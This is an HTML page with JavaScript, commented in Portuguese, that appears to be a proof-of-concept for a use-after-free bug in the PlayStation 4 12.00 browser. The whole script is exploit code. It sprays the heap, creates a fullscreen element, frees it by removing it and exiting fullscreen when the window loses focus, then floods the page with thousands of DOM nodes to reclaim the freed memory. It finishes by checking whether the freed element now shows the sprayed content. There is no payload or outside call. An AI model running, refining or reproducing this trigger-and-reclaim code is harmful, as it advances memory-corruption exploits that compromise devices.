<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim (JS Textbox Logger)</title>
</head>

<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Aggressive Reclaim (Textbox Logger)</h2>
<button onclick="runTest()">Run Test</button>

<!-- 🔥 LOGGER REAL (FIXO NA TELA) -->
<textarea id="logbox"
style="
position:fixed;
bottom:0;
left:0;
width:100%;
height:40%;
background:#000;
color:#0f0;
z-index:999999;
font-family:monospace;
overflow:auto;
">
</textarea>

<script>

// ==========================
// LOGGER CORRETO (textbox persistente)
// ==========================
function log(msg) {
    try { console.log(msg); } catch(e){}
    let box = document.getElementById("logbox");
    if (!box) return;

    box.value += msg + "\n";
    box.scrollTop = box.scrollHeight;
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 🎯 TARGETED RECLAIM
// ==========================
function targetedReclaim() {
    log("[*] Targeted reclaim iniciado");

    let bucket = [];

    // Fragmentação leve
    for (let i = 0; i < 5000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔥 CLONE DO fsTarget
    for (let i = 0; i < 20000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "<h1>REUSE_" + i + "</h1>";
        el.style.background = "black";
        el.style.width = "100%";
        el.style.height = "100%";
        el.style.position = "absolute";
        el.style.top = "0";
        el.style.left = "0";

        document.body.appendChild(el);
        bucket.push(el);

        if (i < 40) log("REUSE_EL_" + i);
    }

    // Pressão extra
    for (let i = 0; i < 10000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    log("[*] Targeted reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        let val = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + val);

        if (val && val.includes("REUSE_")) {
            log("🔥 REUSE DETECTADO (innerHTML)");
        }

    } catch(e) {
        log("[UAF] innerHTML erro: " + e);
    }

    try {
        let outer = fsTarget.outerHTML;
        log("[CHECK] outerHTML = " + outer);

        if (outer && outer.includes("REUSE_")) {
            log("🔥 REUSE DETECTADO (outerHTML)");
        }

    } catch(e) {
        log("[UAF] outerHTML erro: " + e);
    }

    try {
        let txt = fsTarget.textContent;
        log("[CHECK] textContent = " + txt);

        if (txt && txt.includes("REUSE_")) {
            log("🔥 REUSE DETECTADO (textContent)");
        }

    } catch(e) {
        log("[UAF] textContent erro: " + e);
    }

    try {
        let node = fsTarget.firstChild;
        log("[CHECK] firstChild = " + node);
    } catch(e) {
        log("[UAF] firstChild erro: " + e);
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger: remove + exitFullscreen");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }

    } catch(e) {
        log("[ERRO] " + e);
    }

    // 🔥 janela crítica
    setTimeout(() => targetedReclaim(), 0);
    setTimeout(() => targetedReclaim(), 50);
    setTimeout(() => targetedReclaim(), 100);

    setTimeout(() => checkUAF(fsTarget), 300);

    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN
// ==========================
function runTest() {
    document.getElementById("logbox").value = "";

    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado");

        setTimeout(() => trigger(fsTarget), 3000);
    };
}
</script>

</body>
</html>
